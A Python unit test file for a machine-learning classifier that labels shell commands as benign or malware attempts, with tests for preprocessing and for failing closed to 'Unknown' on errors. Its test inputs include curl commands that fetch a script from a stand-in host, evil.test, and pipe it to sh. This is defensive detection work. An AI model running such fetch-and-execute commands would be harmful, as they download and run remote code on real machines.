import unittest
from unittest.mock import patch

from ml import attack_classifier


class DummyVectorizer:
    def transform(self, values):
        self.values = values
        return values


class DummyClassifier:
    classes_ = ["Benign", "Malware Attempt"]

    def predict(self, values):
        if "curl http://evil.test/payload.sh" in values[0]:
            return ["Malware Attempt"]
        return ["Benign"]

    def predict_proba(self, values):
        if "curl http://evil.test/payload.sh" in values[0]:
            return [[0.05, 0.95]]
        return [[0.8, 0.2]]


class ExplodingClassifier:
    def predict(self, values):
        raise RuntimeError("bad model")


class AttackClassifierTests(unittest.TestCase):
    def tearDown(self):
        attack_classifier.reset_model_cache()

    def test_preprocess_preserves_shell_signal_and_normalizes_empty(self):
        self.assertEqual(
            attack_classifier.preprocess("  Curl  HTTP://Evil.test/a.sh | SH!!  "),
            "curl http://evil.test/a.sh | sh",
        )
        self.assertEqual(attack_classifier.preprocess(""), "unknown")
        self.assertEqual(attack_classifier.preprocess(None), "none")

    def test_missing_model_fails_closed_to_unknown(self):
        attack_classifier.reset_model_cache()
        with patch.object(attack_classifier.os.path, "exists", return_value=False):
            details = attack_classifier.predict_details("whoami")

        self.assertEqual(details["attack_category"], "Unknown")
        self.assertFalse(details["model_loaded"])
        self.assertEqual(details["error"], "missing_model_artifact")

    def test_predict_returns_category_and_confidence_when_loaded(self):
        attack_classifier._classifier = DummyClassifier()
        attack_classifier._vectorizer = DummyVectorizer()

        details = attack_classifier.predict_details(" CURL http://evil.test/payload.sh ")

        self.assertEqual(details["attack_category"], "Malware Attempt")
        self.assertEqual(details["confidence"], 0.95)
        self.assertTrue(details["model_loaded"])
        self.assertEqual(attack_classifier.predict("ls -la"), "Benign")

    def test_prediction_errors_fail_closed_without_crashing(self):
        attack_classifier._classifier = ExplodingClassifier()
        attack_classifier._vectorizer = DummyVectorizer()

        details = attack_classifier.predict_details("whoami")

        self.assertEqual(details["attack_category"], "Unknown")
        self.assertTrue(details["model_loaded"])
        self.assertEqual(details["error"], "predict_failed:RuntimeError")


if __name__ == "__main__":
    unittest.main()
